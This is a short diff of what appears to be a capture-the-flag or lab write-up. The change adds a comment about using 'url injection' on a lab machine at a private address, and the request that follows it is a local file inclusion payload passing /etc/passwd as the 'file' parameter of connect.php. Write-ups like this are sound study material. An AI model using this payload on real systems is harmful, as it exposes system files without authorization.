@@ -24,10 +24,13 @@ http://192.168.73.147/connect.php {its shows blank so is use another method}
 ~
 `
 `
-``
-`
-`
-`
+
+
+
+
+
+# Then i simply perform url injection for getting the passwd file insidings
+
 http://192.168.73.147/connect.php?file=/etc/passwd
 
 ![2024-09-16_21-11](https://github.com/user-attachments/assets/7552f865-0c14-46b2-938f-545621631b38)
